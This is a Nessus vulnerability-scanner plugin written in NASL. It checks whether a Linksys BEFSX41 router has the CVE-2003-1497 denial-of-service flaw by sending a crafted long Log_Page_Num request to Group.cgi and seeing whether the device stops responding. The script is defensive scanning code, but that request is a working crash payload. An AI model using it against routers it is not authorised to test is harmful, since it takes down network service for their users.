#
# Linksys EtherFast Cable/DSL Firewall Router
# BEFSX41 (Firmware 1.44.3) DoS
#
# Changes by Tenable:
# - Revised plugin title, added OSVDB ref, changed family (1/21/2009)


include("compat.inc");

if(description)
{
  script_id(11891);
  script_cve_id("CVE-2003-1497");
  script_bugtraq_id(8834);
  script_xref(name:"OSVDB", value:"51488");
  script_version ("$Revision: 1.9 $");

  script_name(english:"Linksys BEFSX41 System Log Viewer Log_Page_Num Variable Overflow DoS");

 script_set_attribute(attribute:"synopsis", value:
"The remote host is vulnerable to a Denial of Service attack." );
 script_set_attribute(attribute:"description", value:
"The remote host seems to be a Linksys EtherFast Cable Firewall/Router.

This product is vulnerable to a remote Denial of service attack : if logging 
is enabled, an attacker can specify a long URL which results in the router 
becoming unresponsive." );
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b9f768be" );
 script_set_attribute(attribute:"solution", value:
"Update firmware to version 1.45.3 
http://www.linksys.com/download/firmware.asp?fwid=172." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:S/C:N/I:N/A:C" );


script_end_attributes();

  summary["english"] = "URL results in DoS of Linksys router";
  script_summary(english:summary["english"]);
  script_category(ACT_DENIAL);
  script_copyright(english:"This script is Copyright (C) 2003-2009 Matt North");

  script_family(english:"CISCO");
  script_dependencie("find_service1.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("global_settings.inc");
include("http_func.inc");

if (report_paranoia < 2) exit(0);


port = get_http_port(default:80);

if(http_is_dead(port:port))exit(0);

banner = get_http_banner(port:port);
if(!banner)exit(0);
if("linksys" >!< banner)exit(0);

soc = open_sock_tcp(port);
if(!soc) exit(0);


req = http_get(port: port, item: "/Group.cgi?Log_Page_Num=1111111111&LogClear=0");
send(socket: soc , data: req);
close(soc);
alive = open_sock_tcp(port);
if (!alive) security_warning(port);
